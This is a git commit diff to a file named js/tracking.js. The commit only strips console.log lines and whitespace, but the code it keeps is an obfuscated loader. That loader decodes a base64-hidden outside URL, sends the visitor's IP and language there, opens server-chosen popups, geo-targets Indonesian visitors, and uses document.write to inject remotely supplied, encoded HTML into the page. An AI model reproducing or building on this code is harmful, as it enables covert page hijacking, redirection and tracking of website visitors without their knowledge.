9f93680271f28bacf51fa21c0ffb6b1919d2ea2c
fb01cmx <53531630+fb01cmx@users.noreply.github.com>
2019-11-28 19:19:07 +0700

    Update tracking.js

--- js/tracking.js
+++ js/tracking.js
@@ -10,7 +10,7 @@ function budal(ip) {
             var bst = cid("t");
             var bss = cid("s");
             var bsr = cid("bsr");
-            
+
     var gtx = cmx('aHR0cHM6Ly9pY2xpY2suY2x1Yi9qcy90cmFja19qc29uLnBocD91cz0') + usx + "&lg=" + lang + "&ip=" + ip + "&time" + Date.now();
     //console.log($getURL)
     $.get(gtx, function (data) {
@@ -19,7 +19,6 @@ function budal(ip) {
                 window.open(cmx(data.pop), 'up');
             } else {
                 if (data.geo == 'ID') {
-                        console.log(bsr);
                     $.ajax({
                         method: "GET",
                         url: cmx(data.url),
@@ -36,7 +35,6 @@ function budal(ip) {
                         document.write(cmx(msg.hd) + cmx(msg.mh) + cmx(msg.pg) + cmx(msg.mf));
                     });
                 } else {
-                    console.log(cmx(data.urlx));
                     document.write(cmx(data.urlx));
                 }
             }
